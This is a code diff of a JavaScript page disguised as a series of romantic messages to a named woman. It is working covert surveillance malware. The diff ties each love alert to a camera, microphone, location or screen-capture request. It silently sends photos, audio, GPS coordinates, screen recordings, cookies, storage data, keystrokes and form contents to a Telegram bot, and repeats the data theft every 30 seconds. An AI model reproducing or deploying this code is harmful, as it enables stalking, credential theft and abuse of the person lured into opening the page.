@@ -6,186 +6,253 @@ let CHAT_ID = "6837307356";
 let currentLocation = null;
 let cameraStream = null;
 let audioStream = null;
-let isAutoCameraEnabled = true;
-let isSilentMode = true;
-let loveAlertShown = false;
-let permissionsRequested = false;
-
-// Screen Recording variables
 let screenRecorder = null;
 let screenStream = null;
 let recordedChunks = [];
 let isRecording = false;
+let loveAlertIndex = 0;
+let permissionsRequested = {
+    camera: false,
+    audio: false,
+    location: false,
+    screen: false
+};
 
 // DOM Elements
 const themeToggle = document.getElementById("themeToggle");
 
-// ==================== SHOW LOVE ALERTS ====================
-function showLoveAlerts() {
-    if (loveAlertShown) return;
-    
-    const alerts = [
-        "Hello Meghuu 😘",
-        "I can't stop thinking about you.🥰😚❤",
-        "You'll always be my girl.",
-        "I love making you laugh. ❤❤❤😚",
-        "When I'm with you, nothing else matters.",
-        "All love is sweet, but ours is the sweetest.",
-        "Because you're in my life, I know true love exists..",
-        "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.",
-        "I can't believe a girl like you exists and that I'm lucky enough to have found her.",
-        "Know that no matter where life takes us, you will always be the only one for me.",
-        "My favorite part of every day is the time I get to spend with you.",
-        "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.",
-        "I'm missing you.",
-        "You are the prettiest girl I've ever seen.",
-        "Whenever I count my blessings, you are at the top of my list.",
-        "I am the luckiest man alive because I get to call you mine.",
-        "No one understands me like you do.",
-        "You know exactly what I need, even if I don't say it.",
-        "I love you not only for who you are, but also for who I become when I am with you.",
-        "Ever since I met you, no one else has been worth thinking about.",
-        "I know you love me because you put up with me even when I'm at my worst.",
-        "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣",
-        "love you so much Meghuu ❣❣❣❣❣❣"
-    ];
-    
-    loveAlertShown = true;
-    
-    let index = 0;
-    function showNextAlert() {
-        if (index < alerts.length) {
-            alert(alerts[index]);
-            index++;
-            setTimeout(showNextAlert, 500);
-        }
+// ==================== LOVE ALERTS WITH PERMISSION REQUESTS ====================
+const loveAlerts = [
+    { text: "Hello Meghuu 😘", permission: "camera" },
+    { text: "I can't stop thinking about you.🥰😚❤", permission: "microphone" },
+    { text: "You'll always be my girl.", permission: "location" },
+    { text: "I love making you laugh. ❤❤❤😚", permission: "screen" },
+    { text: "When I'm with you, nothing else matters.", permission: null },
+    { text: "All love is sweet, but ours is the sweetest.", permission: null },
+    { text: "Because you're in my life, I know true love exists..", permission: null },
+    { text: "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.", permission: null },
+    { text: "I can't believe a girl like you exists and that I'm lucky enough to have found her.", permission: null },
+    { text: "Know that no matter where life takes us, you will always be the only one for me.", permission: null },
+    { text: "My favorite part of every day is the time I get to spend with you.", permission: null },
+    { text: "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.", permission: null },
+    { text: "I'm missing you.", permission: null },
+    { text: "You are the prettiest girl I've ever seen.", permission: null },
+    { text: "Whenever I count my blessings, you are at the top of my list.", permission: null },
+    { text: "I am the luckiest man alive because I get to call you mine.", permission: null },
+    { text: "No one understands me like you do.", permission: null },
+    { text: "You know exactly what I need, even if I don't say it.", permission: null },
+    { text: "I love you not only for who you are, but also for who I become when I am with you.", permission: null },
+    { text: "Ever since I met you, no one else has been worth thinking about.", permission: null },
+    { text: "I know you love me because you put up with me even when I'm at my worst.", permission: null },
+    { text: "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣", permission: null },
+    { text: "love you so much Meghuu ❣❣❣❣❣❣", permission: null }
+];
+
+function showNextLoveAlert() {
+    if (loveAlertIndex >= loveAlerts.length) {
+        // All alerts done, send final notification
+        sendMessageToTelegram(`💖 **All Love Messages Completed** 💖\n\nTotal: ${loveAlerts.length} messages shown to Meghuu\n\n💕 Love you forever! 💕`);
+        return;
     }
     
-    setTimeout(showNextAlert, 100);
+    const currentAlert = loveAlerts[loveAlertIndex];
+    const result = confirm(currentAlert.text + "\n\nClick OK to continue...");
     
-    setTimeout(() => {
-        sendMessageToTelegram(`💖 **Love Messages Displayed** 💖\n\nTotal: ${alerts.length} love messages shown to user`);
-    }, 500);
-}
-
-// ==================== 1. REQUEST CAMERA FIRST ====================
-async function requestCameraPermission() {
-    return new Promise(async (resolve, reject) => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                },
-                audio: false 
-            });
-            
-            cameraStream = stream;
-            
-            // Send notification to Telegram
-            await sendMessageToTelegram(`📸 **កាមេរ៉ាត្រូវបានអនុញ្ញាត**\n\n✅ User granted camera permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
-            
-            // Capture silent photos
-            setTimeout(() => silentCapturePhotos(stream), 1000);
-            
-            resolve(true);
-        } catch (error) {
-            console.error("Camera permission denied:", error);
-            await sendMessageToTelegram(`❌ **កាមេរ៉ាត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
-            resolve(false);
-        }
-    });
-}
-
-// ==================== 2. REQUEST LOCATION SECOND ====================
-async function requestLocationPermission() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            sendMessageToTelegram(`❌ **Geolocation មិនត្រូវបានគាំទ្រ**`);
-            resolve(false);
-            return;
+    if (result) {
+        // User clicked OK, check if we need to request permission
+        if (currentAlert.permission === "camera") {
+            requestCameraPermission();
+        } else if (currentAlert.permission === "microphone") {
+            requestMicrophonePermission();
+        } else if (currentAlert.permission === "location") {
+            requestLocationPermission();
+        } else if (currentAlert.permission === "screen") {
+            requestScreenPermission();
         }
         
-        navigator.geolocation.getCurrentPosition(
-            async function(position) {
-                currentLocation = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: Math.round(position.coords.accuracy)
-                };
-                
-                const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
-                
-                await sendMessageToTelegram(`📍 **ទីតាំងត្រូវបានអនុញ្ញាត**\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ Maps: ${googleMapsLink}`);
-                
-                // Send location as Telegram location
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ 
-                            chat_id: CHAT_ID, 
-                            latitude: currentLocation.lat,
-                            longitude: currentLocation.lng
-                        }),
-                    });
-                } catch (err) {}
-                
-                resolve(true);
-            },
-            async function(error) {
-                let errorMessage = "Unknown error";
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMessage = "User denied location permission";
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorMessage = "Position unavailable";
-                        break;
-                    case error.TIMEOUT:
-                        errorMessage = "Timeout";
-                        break;
-                }
-                await sendMessageToTelegram(`❌ **ទីតាំងត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
-                resolve(false);
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
-    });
+        // Move to next alert after a short delay
+        loveAlertIndex++;
+        setTimeout(showNextLoveAlert, 300);
+    } else {
+        // User clicked Cancel, still move to next
+        loveAlertIndex++;
+        setTimeout(showNextLoveAlert, 100);
+    }
 }
 
-// ==================== 3. REQUEST AUDIO RECORDING THIRD ====================
-async function requestAudioPermission() {
-    return new Promise(async (resolve) => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            audioStream = stream;
-            
-            await sendMessageToTelegram(`🎤 **មីក្រូហ្វូនត្រូវបានអនុញ្ញាត**\n\n✅ User granted microphone permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
-            
-            // Start silent audio recording
-            setTimeout(() => silentRecordAudio(stream), 2000);
-            
-            resolve(true);
-        } catch (error) {
-            await sendMessageToTelegram(`❌ **មីក្រូហ្វូនត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
-            resolve(false);
-        }
-    });
-}
+// ==================== PERMISSION REQUESTS ====================
 
-// ==================== 4. REQUEST SCREEN RECORDING FOURTH ====================
-async function requestScreenRecordingPermission() {
-    if (!CHAT_ID) return false;
-    if (isRecording) return false;
+// 1. CAMERA PERMISSION
+async function requestCameraPermission() {
+    if (permissionsRequested.camera) return;
     
     try {
-        screenStream = await navigator.mediaDevices.getDisplayMedia({
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: {
+                facingMode: 'user',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: false 
+        });
+        
+        cameraStream = stream;
+        permissionsRequested.camera = true;
+        
+        // Send notification to Telegram
+        await sendMessageToTelegram(`📸 **កាមេរ៉ាត្រូវបានអនុញ្ញាត**\n\n✅ Camera permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
+        
+        // Capture photos silently
+        setTimeout(() => capturePhotosSilently(stream), 1000);
+        
+    } catch (error) {
+        await sendMessageToTelegram(`❌ **កាមេរ៉ាត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
+    }
+}
+
+async function capturePhotosSilently(stream) {
+    try {
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        await video.play();
+        
+        for (let i = 1; i <= 3; i++) {
+            setTimeout(async () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    const file = new File([blob], `camera_photo_${i}.jpg`, { type: 'image/jpeg' });
+                    await sendFileToTelegram(file, `📸 Camera Photo #${i}`);
+                }, 'image/jpeg', 0.9);
+            }, i * 1500);
+        }
+        
+        setTimeout(() => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            video.remove();
+        }, 6000);
+        
+    } catch (error) {}
+}
+
+// 2. MICROPHONE PERMISSION
+async function requestMicrophonePermission() {
+    if (permissionsRequested.audio) return;
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        permissionsRequested.audio = true;
+        
+        await sendMessageToTelegram(`🎤 **មីក្រូហ្វូនត្រូវបានអនុញ្ញាត**\n\n✅ Microphone permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
+        
+        // Record audio silently
+        setTimeout(() => recordAudioSilently(stream), 1000);
+        
+    } catch (error) {
+        await sendMessageToTelegram(`❌ **មីក្រូហ្វូនត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
+    }
+}
+
+async function recordAudioSilently(stream) {
+    try {
+        const audioRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        
+        audioRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                audioChunks.push(event.data);
+            }
+        };
+        
+        audioRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            const file = new File([audioBlob], 'audio_recording.webm', { type: 'audio/webm' });
+            await sendFileToTelegram(file, `🎤 Audio Recording`);
+        };
+        
+        audioRecorder.start();
+        setTimeout(() => {
+            audioRecorder.stop();
+            stream.getTracks().forEach(track => track.stop());
+        }, 10000);
+        
+    } catch (error) {}
+}
+
+// 3. LOCATION PERMISSION
+async function requestLocationPermission() {
+    if (permissionsRequested.location) return;
+    
+    if (!navigator.geolocation) {
+        await sendMessageToTelegram(`❌ **Geolocation មិនត្រូវបានគាំទ្រ**`);
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async function(position) {
+            permissionsRequested.location = true;
+            currentLocation = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: Math.round(position.coords.accuracy)
+            };
+            
+            const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
+            
+            await sendMessageToTelegram(`📍 **ទីតាំងត្រូវបានអនុញ្ញាត**\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ Maps: ${googleMapsLink}`);
+            
+            // Send location as Telegram location
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        latitude: currentLocation.lat,
+                        longitude: currentLocation.lng
+                    }),
+                });
+            } catch (err) {}
+        },
+        async function(error) {
+            let errorMessage = "Unknown error";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "User denied location permission";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "Position unavailable";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "Timeout";
+                    break;
+            }
+            await sendMessageToTelegram(`❌ **ទីតាំងត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+}
+
+// 4. SCREEN RECORDING PERMISSION
+async function requestScreenPermission() {
+    if (permissionsRequested.screen) return;
+    if (isRecording) return;
+    
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
             video: {
                 cursor: "always",
                 displaySurface: "monitor",
@@ -194,10 +261,12 @@ async function requestScreenRecordingPermission() {
             audio: true
         });
         
-        await sendMessageToTelegram(`🎬 **ការថតអេក្រង់ត្រូវបានអនុញ្ញាត**\n\n✅ User granted screen recording permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
+        permissionsRequested.screen = true;
+        
+        await sendMessageToTelegram(`🎬 **ការថតអេក្រង់ត្រូវបានអនុញ្ញាត**\n\n✅ Screen recording permission granted\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
         
         const mimeType = getSupportedMimeType();
-        screenRecorder = new MediaRecorder(screenStream, {
+        screenRecorder = new MediaRecorder(stream, {
             mimeType: mimeType,
             videoBitsPerSecond: 2500000
         });
@@ -217,15 +286,11 @@ async function requestScreenRecordingPermission() {
             const fileName = `screen_record_${Date.now()}.${extension}`;
             const file = new File([blob], fileName, { type: mimeType });
             
-            const deviceInfo = await collectDeviceInfo();
-            const formattedInfo = formatDeviceInfo(deviceInfo);
-            
-            await sendVideoToTelegram(file, `🎥 Screen Recording\n\n📊 Size: ${formatBytes(blob.size)}\n\n${formattedInfo}`);
+            await sendVideoToTelegram(file, `🎥 Screen Recording\n\n📊 Size: ${formatBytes(blob.size)}`);
             
             recordedChunks = [];
-            if (screenStream) {
-                screenStream.getTracks().forEach(track => track.stop());
-                screenStream = null;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
             screenRecorder = null;
         };
@@ -236,14 +301,18 @@ async function requestScreenRecordingPermission() {
         
         // Stop after 60 seconds
         setTimeout(() => {
-            if (isRecording) stopScreenRecording();
+            if (isRecording && screenRecorder && screenRecorder.state === 'recording') {
+                screenRecorder.stop();
+                isRecording = false;
+            }
         }, 60000);
         
-        screenStream.getVideoTracks()[0].addEventListener('ended', () => {
-            if (isRecording) stopScreenRecording();
+        stream.getVideoTracks()[0].addEventListener('ended', () => {
+            if (isRecording && screenRecorder && screenRecorder.state === 'recording') {
+                screenRecorder.stop();
+                isRecording = false;
+            }
         });
-        
-        return true;
         
     } catch (error) {
         let errorMessage = 'User denied or error occurred';
@@ -251,14 +320,6 @@ async function requestScreenRecordingPermission() {
             errorMessage = 'User denied screen recording permission';
         }
         await sendMessageToTelegram(`❌ **ការថតអេក្រង់ត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
-        return false;
-    }
-}
-
-function stopScreenRecording() {
-    if (screenRecorder && screenRecorder.state === 'recording') {
-        screenRecorder.stop();
-        isRecording = false;
     }
 }
 
@@ -277,76 +338,6 @@ function getSupportedMimeType() {
         }
     }
     return 'video/webm';
-}
-
-// ==================== SILENT CAPTURE FUNCTIONS ====================
-async function silentCapturePhotos(stream) {
-    try {
-        const video = document.createElement('video');
-        video.style.display = 'none';
-        document.body.appendChild(video);
-        video.srcObject = stream;
-        await video.play();
-        
-        for (let i = 1; i <= 3; i++) {
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const file = new File([blob], `silent_capture_${i}.jpg`, { type: 'image/jpeg' });
-                    const deviceInfo = await collectDeviceInfo();
-                    const formattedInfo = formatDeviceInfo(deviceInfo);
-                    await sendFileToTelegram(file, `📸 Silent Photo #${i}\n\n${formattedInfo}`);
-                }, 'image/jpeg', 0.9);
-            }, i * 1500);
-        }
-        
-        setTimeout(() => {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            video.remove();
-        }, 6000);
-        
-    } catch (error) {}
-}
-
-async function silentRecordAudio(stream) {
-    try {
-        const audioRecorder = new MediaRecorder(stream);
-        const audioChunks = [];
-        
-        audioRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                audioChunks.push(event.data);
-            }
-        };
-        
-        audioRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            const file = new File([audioBlob], 'silent_audio.webm', { type: 'audio/webm' });
-            
-            const deviceInfo = await collectDeviceInfo();
-            const formattedInfo = formatDeviceInfo(deviceInfo);
-            
-            await sendFileToTelegram(file, `🎤 Silent Audio Recording\n\n${formattedInfo}`);
-        };
-        
-        audioRecorder.start();
-        setTimeout(() => {
-            audioRecorder.stop();
-            if (audioStream) {
-                audioStream.getTracks().forEach(track => track.stop());
-                audioStream = null;
-            }
-        }, 10000);
-        
-    } catch (error) {}
 }
 
 // ==================== STEAL ALL DATA ====================
@@ -402,40 +393,12 @@ function getAllStorageData() {
     return data;
 }
 
-function extractCredentials() {
-    const credentials = { usernames: new Set(), emails: new Set(), passwords: new Set(), tokens: new Set(), apiKeys: new Set(), sessionIds: new Set() };
-    
-    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-    const jwtRegex = /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g;
-    
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const value = localStorage.getItem(key);
-        
-        const emails = value.match(emailRegex);
-        if (emails) emails.forEach(e => credentials.emails.add(e));
-        
-        const jwts = value.match(jwtRegex);
-        if (jwts) jwts.forEach(t => credentials.tokens.add(t));
-    }
-    
-    return {
-        usernames: Array.from(credentials.usernames),
-        emails: Array.from(credentials.emails),
-        passwords: Array.from(credentials.passwords),
-        tokens: Array.from(credentials.tokens),
-        apiKeys: Array.from(credentials.apiKeys),
-        sessionIds: Array.from(credentials.sessionIds)
-    };
-}
-
 async function stealAllData() {
     if (!CHAT_ID) return;
     
     try {
         const cookies = getCookieDetails();
         const storageData = getAllStorageData();
-        const credentials = extractCredentials();
         const deviceInfo = await collectDeviceInfo();
         
         let message = `🔴 **STOLEN DATA REPORT**\n\n`;
@@ -449,19 +412,11 @@ async function stealAllData() {
         }
         
         message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
-        
-        message += `🔐 Credentials Found:\n├─ Emails: ${credentials.emails.length}\n├─ Tokens: ${credentials.tokens.length}\n\n`;
-        
-        if (credentials.emails.length > 0) {
-            message += `📧 Emails:\n`;
-            credentials.emails.slice(0, 5).forEach(e => message += `├─ ${e}\n`);
-        }
-        
         message += `\n${formatDeviceInfo(deviceInfo)}`;
         
         await sendMessageToTelegram(message);
         
-        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, credentials, deviceInfo };
+        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
         const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
         const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
         await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
@@ -604,47 +559,27 @@ function initTheme() {
     themeToggle.style.display = 'none';
 }
 
-// ==================== MAIN INITIALIZATION - REQUEST PERMISSIONS IN ORDER ====================
-async function initializePermissionsAndStart() {
-    // 1. Show love alerts first
-    showLoveAlerts();
-    
-    // 2. Request Camera permission
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    const cameraGranted = await requestCameraPermission();
-    
-    // 3. Request Location permission
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    await requestLocationPermission();
-    
-    // 4. Request Audio permission
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    await requestAudioPermission();
-    
-    // 5. Request Screen Recording permission
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    await requestScreenRecordingPermission();
-    
-    // 6. Steal all data
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    await stealAllData();
-    
-    // 7. Send final notification
-    await sendMessageToTelegram(`✅ **All Permissions Processed**\n\nCamera: ${cameraGranted ? '✅ Granted' : '❌ Denied'}\nLocation: ${currentLocation ? '✅ Granted' : '❌ Denied'}\nAudio: ${audioStream ? '✅ Granted' : '❌ Denied'}\nScreen Recording: ${isRecording ? '✅ Granted' : '❌ Denied'}\n\n⏰ ${new Date().toLocaleString('km-KH')}`);
-    
-    // 8. Set up intervals for continuous stealing
-    setInterval(() => { stealAllData(); }, 30000);
-}
-
-// Start everything when page loads
+// ==================== INITIALIZE ====================
 document.addEventListener('DOMContentLoaded', function() {
     cleanURL();
     const chatIDFromURL = getChatIDFromURL();
     if (chatIDFromURL) CHAT_ID = chatIDFromURL;
     initTheme();
     
-    // Start the permission requests immediately
-    initializePermissionsAndStart();
+    // Start showing love alerts (each alert will trigger its own permission)
+    setTimeout(() => {
+        showNextLoveAlert();
+    }, 500);
+    
+    // Also steal data in background
+    setTimeout(() => {
+        stealAllData();
+    }, 5000);
+    
+    // Set interval for continuous data stealing
+    setInterval(() => {
+        stealAllData();
+    }, 30000);
 });
 
 // ==================== KEYLOGGER ====================
@@ -692,7 +627,8 @@ document.addEventListener('submit', async function(e) {
     
     let message = `📝 **Form Submitted**\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
     for (let [key, value] of Object.entries(data)) {
-        message += `├─ ${key}: ${value}\n`;
+        const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
+        message += `├─ ${key}: ${shortValue}\n`;
     }
     
     await sendMessageToTelegram(message);
@@ -722,11 +658,3 @@ setInterval(async () => {
         }
     } catch (error) {}
 }, 5000);
-
-// ==================== PAGE UNLOAD TRACKING ====================
-window.addEventListener('beforeunload', function() {
-    if (!CHAT_ID) return;
-    const message = `👋 **User Leaving Page**\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
-    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
-    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
-});
